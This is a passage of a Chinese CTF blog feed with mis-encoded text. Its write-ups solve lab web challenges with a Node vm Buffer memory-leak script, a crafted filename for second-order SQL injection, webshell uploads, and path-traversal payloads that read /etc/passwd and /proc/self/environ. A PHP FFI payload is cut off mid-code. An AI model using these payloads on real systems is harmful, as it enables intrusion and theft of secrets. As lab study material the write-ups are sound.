&#125;);        console.log(req.query.data);        res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));    &#125; else &#123;        res.send(fs.readFileSync(__filename).toString());    &#125;&#125;);app.listen(3000, function() &#123;    console.log(&quot;listening on port 3000!&quot;);&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><blockquote><p>The <code>vm</code> module enables compiling and running code within V8 Virtual Machine contexts. <strong>The <code>vm</code> module is not a security mechanism. Do not use it to run untrusted code.</strong></p></blockquote><p>æ˜¯åœ¨vmè™šæ‹Ÿæœºä¸­</p><blockquote><p>åœ¨è¾ƒæ—©ä¸€ç‚¹çš„nodeç‰ˆæœ¬ä¸­(8.0 ä¹‹å‰)ï¼Œå½“Bufferçš„æ„é€ å‡½æ•°ä¼ å…¥æ•°å­—æ—¶,ä¼šå¾—åˆ°ä¸æ•°å­—é•¿åº¦ä¸€è‡´çš„ä¸€ä¸ªBufferï¼Œå¹¶ä¸”è¿™ä¸ªBufferæ˜¯æœªæ¸…é›¶çš„ã€‚8.0ä¹‹åçš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªå‡½æ•°Buffer.allocUnsafe(size)æ¥è·å¾—æœªæ¸…ç©ºçš„å†…å­˜ã€‚</p></blockquote><p>è¿™é¢˜&lt;8.0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://aec15194-fd75-4137-b7ca-09b92683d609.node4.buuoj.cn:81/?data=Buffer(500)'</span>response <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag&#123;'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤§æ¦‚æ„æ€å°±æ˜¯ä¸æ–­ä¼ <code>Buffer(500)</code>è¿›å»ï¼Œå°±æœ‰å¯èƒ½æŠŠæ²™ç®±å†…çš„æ•°æ®å¸¦å‡ºæ¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> nodejs </tag>
            
            <tag> æ²™ç®±é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[XDCTF 2015]filemanager</title>
      <link href="/p/2656617040.html"/>
      <url>/p/2656617040.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[äºŒæ¬¡æ³¨å…¥]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910202747103.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>è¯•äº†åŠå¤©ä¸è¡Œï¼ŒåŸæ¥<code>/www.tar.gz</code>æœ‰æºç æ³„æ¼</p><p>æ„Ÿè§‰åƒæ˜¯äºŒæ¬¡æ³¨å…¥+é”™æ˜¾</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910215039218.png"></p><p>è¯•äº†ä¸‹ï¼ŒåŸæ¥ä¸æ˜¯ã€‚</p><p>1.æ„é€ æ–‡ä»¶åä¸º</p><pre class="line-numbers language-none"><code class="language-none">&#39;,extension&#x3D;&#39;&#39;,filename&#x3D;&#39;x.jpg.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä¸Šä¼ </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910233524983.png"></p><p>2.é‡å‘½å</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910233609597.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910233736706.png"></p><p>ä½¿å¾—sqlè¯­å¥å˜ä¸º</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> <span class="token punctuation">`</span><span class="token keyword">file</span><span class="token punctuation">`</span> <span class="token keyword">set</span> <span class="token punctuation">`</span>filename<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">'x.jpg'</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>oldname<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>extension<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>filename<span class="token operator">=</span><span class="token string">'x.jpg'</span> <span class="token keyword">where</span> <span class="token punctuation">`</span>fid<span class="token punctuation">`</span><span class="token operator">=</span>&#123;$result<span class="token punctuation">[</span><span class="token string">'fid'</span><span class="token punctuation">]</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·æ–‡ä»¶åä¸ºx.jpgçš„extensionå°±ä¸ºç©ºäº†ã€‚</p><p>3.ä¸Šä¼ shell</p><p>å½“ä¸‹æƒ…å†µæ˜¯ï¼Œæœ‰ä¸ª<code>x.jpg.jpg</code>çš„æ–‡ä»¶ï¼Œè€Œæ•°æ®åº“é‡Œæœ‰è¡Œ<code>filename=x.jpg, extension=&#39;&#39;</code>çš„æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ä¸Šä¼ ä¸ªx.jpg</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910234924494.png"></p><p>4.é‡å‘½å</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910235018934.png"></p><p>åœ¨è¿™ï¼Œå–çš„æ˜¯<code>x.jpg</code>æœ¬åœ°æ–‡ä»¶ï¼Œæ•°æ®åº“å–çš„æ˜¯<code>filename=x.jpg, extension=&#39;&#39;</code>çš„æ•°æ®è€Œéåˆšåˆšæ–°ä¸Šä¼ çš„æ•°æ®ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210911093339396.png"></p><p>å› ä¸ºextensionä¸ºç©ºï¼Œå°±ä¸ä¼šå†æ‹¼æ¥åç¼€åäº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XDCTF-2015-filemanager/image-20210910235003658.png"></p><p>è¿æ¥ï¼Œç»“æŸã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.csdn.net/qq_36618918/article/details/107768282">https://blog.csdn.net/qq_36618918/article/details/107768282</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[PASECA2019]honey_shop</title>
      <link href="/p/679339218.html"/>
      <url>/p/679339218.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[proc|session]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PASECA2019-honey-shop/image-20210910195243330.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>è¿™ç§é¢˜åšè¿‡å¾ˆå¤šäº†ï¼Œå½“åˆè§£ä¸ªç </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PASECA2019-honey-shop/image-20210910195847956.png" alt="image-20210910195847956"></p><p>æ¥ä¸‹æ¥é—®é¢˜å°±æ˜¯æ‰¾key</p><p>å°è¯•ç ´è§£ä¸€ä¸‹ï¼Œæ²¡æˆåŠŸï¼Œè¿˜æ˜¯å¾—è€è€å®å®æ‰¾key</p><p>ç‚¹å‡»å›¾ç‰‡å¯ä»¥ä¸‹è½½ï¼Œå°è¯•æ–‡ä»¶åŒ…å«æ¼æ´</p><p>å¯è¡Œã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PASECA2019-honey-shop/image-20210910201311755.png"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;self&#x2F;&#x2F; å…¶è·¯å¾„æŒ‡å‘å½“å‰è¿›ç¨‹&#x2F;environ&#x2F;&#x2F; è®°å½•å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯»å–ç¯å¢ƒå˜é‡</p><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PASECA2019-honey-shop/image-20210910201820721.png"></p><pre class="line-numbers language-none"><code class="language-none">O41Bwjq2maq75AD7lFKnfhZv7DoOe8PMEzl4jBHu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŠ å¯†ä¸‹ï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:virink_2019_files_share</title>
      <link href="/p/170828619.html"/>
      <url>/p/170828619.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[é­”æ–¹]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910130313751.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>index.jsæ–‡ä»¶æœ‰è¿™ç§æ··æ·†ä»£ç ï¼Œå¿…æœ‰è¹Šè··ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910191018766.png"></p><p>å¾—ï¼ŒæŠ˜è…¾åŠå¤©æ•´ä¸å‡ºæ¥ï¼ŒåŸæ¥ä¸åœ¨è¿™é‡Œã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910192621403.png"></p><p>/uploadsç›®å½•éå†æ˜¯å¼€ç€çš„</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910192720626.png"></p><p>è¯»å–ä¸‹/etc/passwd</p><p>ä¼¼ä¹æœ‰è¿‡æ»¤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910193115046.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910193339328.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910193357908.png"></p><p>æ˜¾ç„¶ï¼Œ<code>../</code>å’Œ<code>/</code>è¢«æ›¿æ¢ä¸ºç©ºï¼Œä½†å¯ä»¥åŒå†™ç»•è¿‡</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-virink-2019-files-share/image-20210910193702819.png"></p><pre class="line-numbers language-none"><code class="language-none">preview?f&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;etc..&#x2F;&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ²¡æƒ³åˆ°æœ€åå¾—å†åŠ ä¸ª/flag,å®åœ¨æƒ³ä¸åˆ°</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;preview?f&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;f1ag_Is_h3re..&#x2F;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[CSAWQual 2016]i_got_id</title>
      <link href="/p/563209711.html"/>
      <url>/p/563209711.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[perl]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CSAWQual-2016-i-got-id/image-20210910104442590.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>/cgi-bin/hello.pl</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CSAWQual-2016-i-got-id/image-20210910104458963.png"></p><p>çœ‹æ¥æ˜¯perlè¯­è¨€ï¼Œæ•´ä¸ä¼šäº†ã€‚</p><p>çŒœæµ‹ä¸‹ä¸Šä¼ çš„åç«¯ä»£ç </p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cgi</span><span class="token operator">-></span>upload<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">my</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token string">"$_"</span><span class="token punctuation">;</span>        <span class="token keyword">print</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„fileå˜é‡ä¸­ã€‚è€Œå¯¹äºä¸‹é¢çš„è¯»æ–‡ä»¶é€»è¾‘æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚</p></blockquote><p>è¿™æ ·ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨æ–¹æ³•å°±å‡ºç°äº†ï¼šåœ¨æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶å‰é¢åŠ ä¸Šä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡¹ARGVï¼Œç„¶ååœ¨URLä¸­ä¼ å…¥æ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œè¿™æ ·å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶äº†ã€‚</p><p>å†åŠ ä¸ªä¸Šä¼ é¡¹ï¼Œåˆ æ‰filenameï¼Œæ”¹ä¸ºARGV,ç„¶ååœ¨urlä¸­åŠ ä¸ªè·¯å¾„ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CSAWQual-2016-i-got-id/image-20210910110842899.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Perl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[RCTF 2019]Nextphp</title>
      <link href="/p/2407208614.html"/>
      <url>/p/2407208614.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ç»•è¿‡disable_function|FFI]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ä¸Šæ¥ä¸€ä¸ªé©¬ï¼ŒæŠŠæˆ‘æ•´æ…Œäº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202022801.png"></p><p>è¿æ¥èšå‰‘è¿”å›ç©ºå€¼ï¼Œçœ‹æ¥æ²¡é‚£ä¹ˆç®€å•</p><p>çœ‹çœ‹ç¦ç”¨å‡½æ•°</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202202745.png"></p><p>é™åˆ¶äº†<strong>open_basedir</strong></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202720598.png"><br>FFIå¼€å¯<br><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909211330936.png"></p><p>æ€ªï¼Œèšå‰‘ç›´æ¥è¿æ¥è¿ä¸ä¸Šï¼Œé‡æ–°å†™äº†ä¸ªé©¬å€’æ˜¯å¯ä»¥ã€‚</p><p>é‡Œé¢æœ‰ä¸ªpreload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'print_r'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'1'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªpreloadæ–‡ä»¶å°±æ˜¯æ‹¿æ¥ç»•è¿‡disable_functionçš„ï¼Œä¸»è¦æ˜¯åˆ©ç”¨<a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a></p><blockquote><p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a>æ˜¯ <strong>PHP7.4</strong> ä¸­æ–°åŠ å…¥çš„åŠŸèƒ½ã€‚å¦‚æœè®¾ç½®äº†<a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a> ï¼Œé‚£ä¹ˆåœ¨æ‰€æœ‰Webåº”ç”¨ç¨‹åºè¿è¡Œä¹‹å‰ï¼ŒæœåŠ¡ä¼šå…ˆå°†è®¾å®šçš„<strong>preload</strong>æ–‡ä»¶åŠ è½½è¿›å†…å­˜ä¸­ï¼Œä½¿è¿™äº›<strong>preload</strong>æ–‡ä»¶ä¸­çš„å†…å®¹å¯¹ä¹‹åçš„è¯·æ±‚å‡å¯ç”¨ã€‚æ›´å¤šç»†èŠ‚å¯ä»¥é˜…è¯»ï¼š<a href="https://wiki.php.net/rfc/preload">https://wiki.php.net/rfc/preload</a></p></blockquote><p>æœ€åæœ‰ä¸€æ®µè¯</p><blockquote><p>In conjunction with ext/FFI (dangerous extension), we may allow FFI functionality only in preloaded PHP files, but not in regular ones</p><p>å…è®¸åœ¨<strong>preload</strong>æ–‡ä»¶ä¸­ä½¿ç”¨<strong>FFI</strong>æ‹“å±•ï¼Œä½†<strong>FFI</strong>æ˜¯ä¸€ä¸ªå±é™©çš„æ‹“å±•</p></blockquote><p>è¿™é¢˜å¼€äº†FFIï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨<a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// create FFI object, loading libc and exporting function printf()</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span>    <span class="token string double-quoted-string">"int printf(const char *format, ...);"</span><span class="token punctuation">,</span> <span class="token comment">// this is regular C declaration</span>    <span class="token string double-quoted-string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// call C printf()</span><span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello %s!\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadä¸º</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token 